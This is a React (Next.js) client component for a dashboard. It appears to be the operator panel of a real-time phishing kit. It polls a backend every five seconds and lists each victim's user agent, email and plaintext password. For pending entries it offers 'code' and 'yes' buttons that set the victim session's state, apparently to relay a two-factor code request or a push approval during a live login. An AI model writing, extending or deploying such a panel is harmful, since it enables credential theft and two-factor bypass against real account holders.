"use client";
import { changeState, getAllData } from "@/actions";
import { useEffect, useState } from "react";

export default function DashboardDataTable() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [pending, setPending] = useState(false);
  async function getData() {
    setLoading(true);
    let res = await getAllData();
    if (res) {
      setData(JSON.parse(res)["data"].reverse());
    }
    setLoading(false);
  }
  useEffect(() => {
    getData();
    setInterval(getData, 5000);
  }, []);
  if (!data) {
    return (
      <tbody>
        <tr className="text-center">
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
        </tr>
      </tbody>
    );
  }
  if (data.length == 0) {
    return (
      <tbody>
        <tr className="text-center">
          <td colSpan={4} className="border px-4 text-red-500  py-2">
            No Data
          </td>
        </tr>
      </tbody>
    );
  }
  return (
    <tbody>
      {loading && <div className="absolute top-5 left-1/2">loading ..</div>}
      {data.map((item, index) => (
        <tr key={index}>
          <td className="border px-4 py-2">{item.userAgent}</td>
          <td className="border px-4 py-2">{item.email}</td>
          <td className="border px-4 py-2">{item.password}</td>
          {item.state === "pending" ? (
            <td className="border px-4 py-2 flex flex-col gap-1">
              {pending ? (
                <div className="text-red-500">pending...</div>
              ) : (
                <>
                  <button
                    onClick={async () => {
                      setPending(true);
                      let code = prompt("code");
                      await changeState(item._id, "code", code);
                      getData();
                      setPending(false);
                    }}
                    disabled={pending}
                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
                  >
                    {"code"}
                  </button>
                  <button
                    onClick={async () => {
                      setPending(true);
                      await changeState(item._id, "yes");
                      getData();
                      setPending(false);
                    }}
                    disabled={pending}
                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
                  >
                    {"yes"}
                  </button>
                </>
              )}
            </td>
          ) : (
            <td className="border px-4 py-2">{item.state}</td>
          )}
        </tr>
      ))}
    </tbody>
  );
}
